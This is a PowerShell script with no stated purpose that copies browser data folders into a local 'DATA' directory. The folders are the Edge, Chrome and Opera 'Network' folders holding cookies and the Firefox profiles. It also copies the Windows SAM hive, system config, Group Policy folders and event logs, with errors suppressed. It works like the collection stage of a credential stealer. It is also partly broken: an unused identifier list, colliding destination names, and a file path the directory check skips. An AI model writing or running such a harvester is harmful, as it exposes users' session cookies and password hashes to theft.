# Define the list of source paths with placeholders
$sourcePaths = @(
    "C:\Users\{}\AppData\Local\Microsoft\Edge\User Data\Default\Network",
    "C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\Network",
    "C:\Users\{}\AppData\Roaming\Mozilla\Firefox\Profiles",
    "C:\Users\{}\AppData\Roaming\Opera Software\Opera Stable\Network",
    "C:\Users\{}\AppData\Roaming\Opera Software\Opera GX Stable\Network",
    'C:\\WINDOWS\\system32\\config\\SAM',
    'C:\\Windows\\System32\\config',
    'C:\\Windows\\System32\\GroupPolicy',
    'C:\\Windows\\System32\\GroupPolicyUsers',
    'C:\\Windows\\System32\\winevt\\Logs'
)

# Define the list of identifiers for renaming
$identifiers = @(
    "Edge",
    "Chrome",
    "Firefox",
    "OperaStable",
    "OperaGXStable",
    "SAM",
    "SystemConfig",
    "GroupPolicy",
    "GroupPolicyUsers",
    "WindowsEventLogs"
)

# Get the current user's name
$currentUser = $env:USERNAME

# Define the base directory for the destination
$baseDirectory = "DATA"

# Loop through each source path
foreach ($sourcePath in $sourcePaths) {
    # Replace the placeholder with the current user's name
    $fullSourcePath = $sourcePath -replace '\{\}', $currentUser

    # Check if the source path exists and is readable
    if (-not (Test-Path $fullSourcePath -PathType Container -ErrorAction SilentlyContinue)) {
        Write-Host "WARNING: Source path $fullSourcePath does not exist or cannot be accessed."
        continue
    }

    # Extract the identifier from the source path
    $identifier = $sourcePath.Split('\')[-1].Split('\\')[-1]

    # Define the destination path
    $destinationPath = Join-Path -Path $baseDirectory -ChildPath "USER_$identifier"

    # Check if the destination directory exists, create it if not
    if (-not (Test-Path $destinationPath -PathType Container -ErrorAction SilentlyContinue)) {
        New-Item -ItemType Directory -Path $destinationPath -Force | Out-Null
    }

    # Attempt to copy the folder to the DATA directory and rename it
    try {
        Copy-Item -Path $fullSourcePath -Destination $destinationPath -Recurse -Force -ErrorAction SilentlyContinue
        # Print the message to the console
        Write-Host "INFO: Copied $fullSourcePath to $destinationPath"
    } catch {
        # Suppress all errors
        Write-Host "ERROR: A unspecified error has occured!, might be due to permissions or a program is using the file"
    }
}
